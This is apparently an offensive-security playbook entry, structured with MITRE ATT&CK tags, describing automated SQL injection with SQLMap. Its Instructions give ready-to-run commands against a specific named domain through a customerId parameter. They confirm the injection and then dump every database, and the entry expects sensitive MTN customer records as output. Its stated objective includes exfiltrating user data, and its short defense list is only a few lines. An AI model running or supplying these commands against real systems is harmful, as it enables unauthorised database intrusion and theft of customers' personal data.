---
id: proc-sqlmap-sqli-exploit-001
tags:
  - sqli
  - automation
  - exploitation
type: procedure
tools:
  - '[[tools/SQLMap]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/sqlmap-exploit-url]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:05.500Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Automated-SQL-Injection-with-SQLMap

## Summary

This procedure uses SQLMap to automate SQLi detection, enumeration, and dumping of the database via the vulnerable customerId parameter.

## Description

SQLMap tests payloads, identifies backend (e.g., MySQL), enumerates DBs/tables, and dumps data. Applied to MTN site URL; extracts user info. Requires Python; high impact on sensitive data.

## Requirements

1. Installed SQLMap
2. Vulnerable URL
3. Sufficient bandwidth for dumps

## Defense

Defensive measures and detection strategies:

- Block SQLMap signatures in WAF
- Database logging for anomalous queries
- IP reputation checks

## Objectives

1. Automate vuln confirmation
2. Enumerate and dump DB
3. Exfiltrate user data

## Instructions

### Step 1: Basic Scan

**Context**: Test and identify injection point.

**Command** ([[commands/sqlmap-exploit-url]]):
```bash
sqlmap -u "http://admyntec.co.za/path/customerId=1" --batch
```

> Outputs vuln confirmation and backend type.

### Step 2: Enumerate and Dump

**Context**: List DBs and extract contents.

**Command** ([[commands/sqlmap-exploit-url]]):
```bash
sqlmap -u "http://admyntec.co.za/path/customerId=1" --dbs --dump-all
```

> Expected: CSV files with tables like users, containing sensitive MTN customer data.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/sqlmap-exploit-url]]

## Tools Used

- [[tools/SQLMap]]

## Tags

- sqli
- automation
